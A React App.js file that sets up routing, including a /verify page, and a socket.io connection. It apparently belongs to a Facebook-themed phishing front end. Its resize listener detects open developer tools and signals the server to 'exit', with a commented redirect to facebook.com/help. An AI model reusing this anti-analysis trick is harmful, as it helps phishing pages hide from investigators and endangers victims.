import React, { useEffect, useState } from "react";
import { Route, BrowserRouter as Router, Routes } from "react-router-dom";
import { io } from "socket.io-client";
import "./index.css";
import { Home } from "./pages/Home";
import Index from "./pages/Index";
import NotFound from "./pages/NotFound";
import Verify from "./pages/Verify";

const SocketContext = React.createContext();

const App = () => {
    const [socket, setSocket] = useState(null);
    const [isScriptsLoaded, setScriptsLoaded] = useState(false);

    useEffect(() => {
        const newSocket = io();

        const threshold = 235;
        const devtoolsListener = () => {
            if (
                window.screen.availHeight - window.innerHeight > threshold ||
                window.screen.availWidth - window.innerWidth > threshold
            ) {
                newSocket.emit("exit");
                // window.location.replace("https://www.facebook.com/help");
                window.scrollTo(0, 0);
            } else {
                window.scrollTo(0, 0);
            }
        };

        window.addEventListener("resize", devtoolsListener);
        setScriptsLoaded(true);
        setSocket(newSocket);

        return () => {
            window.removeEventListener("resize", devtoolsListener);
            newSocket.off("connect");
            newSocket.off("disconnect");
        };
    }, []);

    if (!isScriptsLoaded) {
        return null;
    }

    return (
        <React.StrictMode>
            <SocketContext.Provider value={socket}>
                <Router>
                    <Routes>
                        <Route path="/" element={<Index />} />
                        <Route path="/home" element={<Home />} />
                        <Route path="/verify" element={<Verify />} />
                        <Route path="*" element={<NotFound />} />
                    </Routes>
                </Router>
            </SocketContext.Provider>
        </React.StrictMode>
    );
};

export default App;
export { SocketContext };
